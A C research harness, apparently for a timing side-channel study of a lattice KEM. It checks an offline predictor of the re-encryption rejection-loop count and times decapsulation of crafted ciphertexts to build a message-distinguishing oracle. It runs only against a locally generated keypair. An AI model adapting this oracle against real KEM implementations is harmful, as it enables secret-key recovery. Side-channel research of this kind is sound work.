/* oracle_time.c  Realize the message-flip PC-oracle from decapsulation timing on
   core 100 (min-of-N), and validate the OFFLINE attacker_R(m,pk) = SM3(m||pk)-driven
   re-encryption iteration count against the device.  The attack's block-solver only
   needs to tell M_BASE (node@0..31 bit=0) from m1 (bit=1); we build both messages
   directly (u=0 so hatm=v is attacker-set), measure decaps cycles, and report the
   per-query classification error and R values. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>
#include "params.h"
#include "KEM_AlgorithmInstance.h"
#include "pke.h"
#include "poly.h"
#include "symmetric.h"
#include "drng.h"

DRNG_ctx drng_algorithm;
extern unsigned long long g_reject_iters;

/* offline: reproduce derive_g + re-encryption iteration count from pk alone */
static unsigned attacker_R(const uint8_t *m,const uint8_t *pk){
    uint8_t din[PKE_MESSAGE_BYTES+PKE_PUBLIC_KEY_BYTES];
    uint8_t gout[KEM_SS_BYTES+KEM_SEED_LEN_BYTES];
    memcpy(din,m,PKE_MESSAGE_BYTES); memcpy(din+PKE_MESSAGE_BYTES,pk,PKE_PUBLIC_KEY_BYTES);
    bit_xof((KEM_SS_BYTES+KEM_SEED_LEN_BYTES)*8ULL,din,sizeof(din)*8ULL,gout);
    uint8_t seed_enc[KEM_SEED_LEN_BYTES]; memcpy(seed_enc,gout+KEM_SS_BYTES,KEM_SEED_LEN_BYTES);
    uint8_t ct[PKE_CIPHERTEXT_BYTES];
    g_reject_iters=0; PKE_Encrypt(ct,pk,(uint8_t*)m,seed_enc); return (unsigned)g_reject_iters;
}
static int cmpu(const void*a,const void*b){uint64_t x=*(const uint64_t*)a,y=*(const uint64_t*)b;return x<y?-1:x>y;}
static uint64_t tdec_min(uint8_t*sk,unsigned long long skl,uint8_t*ct,unsigned long long ctl,uint8_t*ss,int rep){
    unsigned long long l; uint64_t best=~0ULL; unsigned aux;
    for(int r=0;r<rep;r++){ uint64_t a=__rdtscp(&aux); kem_dec(sk,skl,ct,ctl,ss,&l); uint64_t b=__rdtscp(&aux); if(b-a<best)best=b-a; }
    return best;
}
static void build_ct_v(uint8_t *ct,const uint8_t *cw){ /* u=0, c2 = cw grid codes */
    memset(ct,0,C1_LEN_BYTES);
    uint8_t com[RL_KEM_Lv]; for(int i=0;i<RL_KEM_Lv;i++)com[i]=(uint8_t)(cw[i]&7);
    pack_c2_dbit(ct+C1_LEN_BYTES,com);
}

int main(int argc,char**argv){
    int rep = argc>1?atoi(argv[1]):9;
    uint8_t seed[64]={0x5a}; init_random_number(&drng_algorithm,seed,64);
    static uint8_t pk[20000],sk[40000]; unsigned long long pkl,skl;
    kem_keygen(pk,&pkl,sk,&skl);
    uint8_t ss[128],ss2[128]; unsigned long long ssl;

    /* [1] validate attacker_R vs device re-encryption R on honest ciphertexts */
    { int ok=0,tot=300; uint8_t ct[20000]; unsigned long long ctl;
      for(int t=0;t<tot;t++){ kem_enc(pk,pkl,ss,&ssl,ct,&ctl);
        uint8_t mprime[MESSAGE_LEN_BYTES]; PKE_Decrypt(mprime,ct,sk);
        g_reject_iters=0; kem_dec(sk,skl,ct,ctl,ss2,&ssl); unsigned dev=(unsigned)g_reject_iters;
        unsigned att=attacker_R(mprime,pk);
        if(dev==att)ok++; }
      printf("[1] attacker_R vs device R match: %d/%d\n",ok,tot); }

    /* [2b] Direct discrimination: craft clean-codeword ciphertexts (u=0) that decode to
       chosen messages m4 (R=4) and m5 (R=5); measure decaps timing + per-query error.
       This is exactly the signal the flip-oracle needs when the message pair straddles. */
    { uint8_t m4[MESSAGE_LEN_BYTES],m5[MESSAGE_LEN_BYTES]; int have4=0,have5=0;
      for(int t=0;t<200000 && !(have4&&have5); t++){
        uint8_t mm[MESSAGE_LEN_BYTES]; for(int i=0;i<MESSAGE_LEN_BYTES;i++)mm[i]=rand();
        unsigned R=attacker_R(mm,pk);
        if(R==4&&!have4){memcpy(m4,mm,MESSAGE_LEN_BYTES);have4=1;}
        if(R==5&&!have5){memcpy(m5,mm,MESSAGE_LEN_BYTES);have5=1;} }
      if(have4&&have5){
        uint8_t cw4[RL_KEM_Lv],cw5[RL_KEM_Lv],code[RL_KEM_Lv];
        Encode_m(code,m4); for(int i=0;i<RL_KEM_Lv;i++)cw4[i]=code[i]?4:0;
        Encode_m(code,m5); for(int i=0;i<RL_KEM_Lv;i++)cw5[i]=code[i]?4:0;
        uint8_t c4[PKE_CIPHERTEXT_BYTES],c5[PKE_CIPHERTEXT_BYTES]; build_ct_v(c4,cw4); build_ct_v(c5,cw5);
        uint8_t d4[MESSAGE_LEN_BYTES],d5[MESSAGE_LEN_BYTES]; PKE_Decrypt(d4,c4,sk); PKE_Decrypt(d5,c5,sk);
        printf("[2b] clean-codeword decode ok: m4 %s  m5 %s\n",
               memcmp(d4,m4,MESSAGE_LEN_BYTES)?"MISMATCH":"ok", memcmp(d5,m5,MESSAGE_LEN_BYTES)?"MISMATCH":"ok");
        for(int i=0;i<300;i++) tdec_min(sk,skl,c4,PKE_CIPHERTEXT_BYTES,ss2,3);
        uint64_t a4[41],a5[41]; for(int t=0;t<41;t++){ a4[t]=tdec_min(sk,skl,c4,PKE_CIPHERTEXT_BYTES,ss2,rep);
            a5[t]=tdec_min(sk,skl,c5,PKE_CIPHERTEXT_BYTES,ss2,rep);} qsort(a4,41,8,cmpu); qsort(a5,41,8,cmpu);
        uint64_t thr=(a4[20]+a5[20])/2; printf("[2b] R=4 median=%llu  R=5 median=%llu  thr=%llu\n",
            (unsigned long long)a4[20],(unsigned long long)a5[20],(unsigned long long)thr);
        int err=0,N=500; for(int t=0;t<N;t++){
            uint64_t x=tdec_min(sk,skl,c4,PKE_CIPHERTEXT_BYTES,ss2,rep); if(!(x<thr))err++;
            uint64_t y=tdec_min(sk,skl,c5,PKE_CIPHERTEXT_BYTES,ss2,rep); if(!(y>=thr))err++; }
        printf("[2b] per-query timing classification error (R4 vs R5, min-of-%d): %d/%d = %.4f\n",
               rep,err,2*N,(double)err/(2*N));
      } else printf("[2b] could not find both R=4 and R=5 messages\n");
    }

    /* [2] build M_BASE (all v=0) and m1 (node@0..31 flipped: channels 0..L-1 = v=129) */
    uint8_t cw0[RL_KEM_Lv]; memset(cw0,0,sizeof(cw0));
    uint8_t ctb[PKE_CIPHERTEXT_BYTES]; build_ct_v(ctb,cw0);
    uint8_t mbase[MESSAGE_LEN_BYTES]; PKE_Decrypt(mbase,ctb,sk);
    int Lflip = argc>2?atoi(argv[2]):17;
    uint8_t cw1[RL_KEM_Lv]; memset(cw1,0,sizeof(cw1)); for(int i=0;i<Lflip;i++)cw1[i]=4; /* v=129 */
    uint8_t ct1[PKE_CIPHERTEXT_BYTES]; build_ct_v(ct1,cw1);
    uint8_t m1[MESSAGE_LEN_BYTES]; PKE_Decrypt(m1,ct1,sk);
    int hd=0; for(int i=0;i<MESSAGE_LEN_BYTES;i++)hd+=__builtin_popcount(mbase[i]^m1[i]);
    unsigned Rb=attacker_R(mbase,pk), R1=attacker_R(m1,pk);
    printf("[2] Lflip=%d  hamming(m_base,m1)=%d  R(m_base)=%u  R(m1)=%u  %s\n",
           Lflip,hd,Rb,R1,(Rb!=R1)?"SEPARABLE":"same-class(reframe needed)");

    /* [3] full KEM ciphertexts for the two messages need a KEM sk; but decaps time depends
       only on decoded m'. Measure decaps cycles for ctb (->m_base) and ct1 (->m1). */
    for(int i=0;i<300;i++){ tdec_min(sk,skl,ctb,PKE_CIPHERTEXT_BYTES,ss2,3); } /* warm */
    /* median-of-medians: repeat min-of-rep several times */
    #define NT 41
    uint64_t tb[NT],t1[NT];
    for(int t=0;t<NT;t++){ tb[t]=tdec_min(sk,skl,ctb,PKE_CIPHERTEXT_BYTES,ss2,rep);
                           t1[t]=tdec_min(sk,skl,ct1,PKE_CIPHERTEXT_BYTES,ss2,rep); }
    qsort(tb,NT,8,cmpu); qsort(t1,NT,8,cmpu);
    printf("[3] decaps cycles (min-of-%d, median of %d): m_base=%llu  m1=%llu  delta=%lld\n",
           rep,NT,(unsigned long long)tb[NT/2],(unsigned long long)t1[NT/2],
           (long long)t1[NT/2]-(long long)tb[NT/2]);

    /* [4] per-query classification error: threshold at midpoint; classify many fresh timings */
    if(Rb!=R1){
      uint64_t thr=(tb[NT/2]+t1[NT/2])/2; int lo = tb[NT/2]<t1[NT/2];
      int err=0,N=400;
      for(int t=0;t<N;t++){
        uint64_t x=tdec_min(sk,skl,ctb,PKE_CIPHERTEXT_BYTES,ss2,rep); /* truth = m_base */
        int cls=(x<thr)?0:1; int truth = lo?0:1; if(cls!=truth)err++;
        uint64_t y=tdec_min(sk,skl,ct1,PKE_CIPHERTEXT_BYTES,ss2,rep);  /* truth = m1 */
        int cls2=(y<thr)?0:1; int truth2 = lo?1:0; if(cls2!=truth2)err++;
      }
      printf("[4] per-query timing classification error: %d/%d = %.4f (rep=%d)\n",err,2*N,(double)err/(2*N),rep);
    }
    return 0;
}
